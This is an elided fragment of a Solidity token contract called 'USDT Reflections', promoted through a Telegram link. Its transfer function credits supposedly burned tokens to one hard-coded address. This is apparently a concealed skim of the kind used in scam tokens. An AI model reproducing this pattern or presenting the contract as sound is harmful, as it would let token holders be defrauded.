...
// Submitted for Telegram: https://t.me/USDTReflectionsBEP20
...
contract  USDTReflections  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "USDT Reflections";
    string private _symbol = "USDR";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0xfcBe181ac2faE899CC4A70a3826642182DbCd58a] += _bruntoken;
